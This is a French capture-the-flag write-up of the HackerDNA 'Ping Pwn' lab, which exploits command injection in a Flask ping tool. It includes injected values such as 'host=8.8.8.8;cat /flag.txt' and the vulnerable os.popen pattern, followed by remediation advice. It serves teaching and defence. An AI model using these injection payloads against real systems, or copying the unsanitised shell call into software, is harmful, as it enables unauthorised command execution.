# Writeup — Ping Pwn (HackerDNA)

Plateforme : HackerDNA
Auteur : SRH
Lab : Ping Pwn
Lien : https://hackerdna.com/labs/ping-pwn
Catégorie : Sécurité Web & API / Injection de commandes (Command Injection)
Difficulté : Intermédiaire (50 XP)
Objectif : Exploiter l'outil de ping pour exécuter des commandes système arbitraires et récupérer le flag

---

## 1. Contexte

Le lab fournit un outil de diagnostic réseau ("Network Monitoring Tool") qui permet
de ping une adresse IP. L'application est construite en Flask (Python) et transmet
directement l'entrée utilisateur à une commande shell via os.popen() sans aucun
assainissement [citation:1][citation:5][citation:12].

L'objectif est d'injecter une commande supplémentaire pour lire le fichier flag
sur le serveur.

---

## 2. Reconnaissance

Un scan Nmap révèle deux ports ouverts :
- Port 80 : nginx (page statique)
- Port 8080 : Werkzeug/Flask (l'outil de ping) [citation:12]

L'outil de ping envoie une requête de type :
curl "http://TARGET:8080/ping?host=8.8.8.8"

La réponse affiche la sortie de la commande ping, confirmant que l'entrée
utilisateur est interpolée directement dans la commande shell.

---

## 3. Exploitation

### Étape 1 — Confirmer l'injection de commandes

On injecte un point-virgule (;) suivi d'une commande système :

host=8.8.8.8;whoami

Réponse : la sortie de ping s'affiche, suivie du résultat de whoami (ex: root).

Cela confirme que le serveur exécute la commande injectée avec les privilèges
du processus Flask (root dans le conteneur) [citation:12].

### Étape 2 — Localiser et lire le flag

On recherche le fichier flag aux emplacements courants :

host=8.8.8.8;ls /

host=8.8.8.8;cat /flag.txt

La sortie affiche le contenu du fichier flag.

### Payload final

host=8.8.8.8;cat /flag.txt

Le flag est retourné dans la réponse HTTP.

---

## 4. Cause racine

Le code backend construit la commande par concaténation de chaînes :

command = f"ping -c 1 {host}"
os.popen(command)  # ou subprocess avec shell=True

L'entrée utilisateur (host) n'est ni validée ni échappée. Le shell interprète
les métacaractères comme ;, &&, | ou ` pour exécuter des commandes supplémentaires [citation:12].

---

## 5. Remédiation

- Ne jamais passer d'entrée utilisateur directement à un shell (éviter shell=True
  et os.popen avec des chaînes).
- Utiliser des API paramétrées : subprocess.run(["ping", "-c", "1", host])
  sans shell=True, pour que le shell ne parse pas l'entrée.
- Valider strictement le champ host avec une whitelist (regex d'adresse IP /
  nom d'hôte).
- Exécuter le service avec un utilisateur à privilèges minimaux (pas root).

---

## 6. Leçons retenues

- Les outils de ping/traceroute web sont des cibles classiques d'injection de
  commandes : toujours tester ;, &&, |, backticks et $().
- Un conteneur qui tourne en root transforme une RCE en compromission totale
  immédiate [citation:12].
- La défense repose sur la séparation code/données (argument array) et la
  validation stricte des entrées.

---
